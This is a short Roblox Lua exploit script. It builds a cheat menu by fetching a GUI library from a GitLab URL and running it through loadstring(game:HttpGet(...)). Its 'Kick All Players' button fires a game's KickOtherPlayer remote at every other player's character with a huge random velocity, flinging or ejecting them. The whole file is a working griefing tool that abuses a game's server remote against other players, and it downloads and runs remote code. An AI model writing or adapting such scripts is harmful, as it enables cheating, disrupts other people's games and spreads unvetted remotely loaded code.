thisPlayer = game:GetService("Players").LocalPlayer
otherPlayer = game:GetService("Players")

local remote = game:GetService("ReplicatedStorage").Remotes.KickOtherPlayer


local config = {
   ["HeaderWidth"] = 200,
   ['PrimaryColor'] = Color3.fromRGB(166, 167, 159),
   ['SecondaryColor'] = Color3.fromRGB(73, 103, 123),
   ["AccentColor"] = Color3.new(0.6,0,0)
}

--- GUI Setup ---
local gui = loadstring(game:HttpGet("https://gitlab.com/0x45.xyz/droplib/-/raw/master/drop-minified.lua"))():Init(config,game.CoreGui)
local lpg = gui:CreateCategory("Player Options ")
--- GUI Setup ---

--- Button Setup --
local kickALL = lpg:CreateButton('Kick All Players', function() kicker() end)


--- Functions Setup ---

function kicker()
    for _, v in pairs(otherPlayer:GetPlayers()) do
        if v ~= thisPlayer then
            remote:FireServer({
                ["OtherCharacter"] = v.Character,
                ["LV"] = Vector3.new(math.random(5000), math.random(5000), math.random(5000))})
                print('kicking '..v.name)
            end
        end
    end



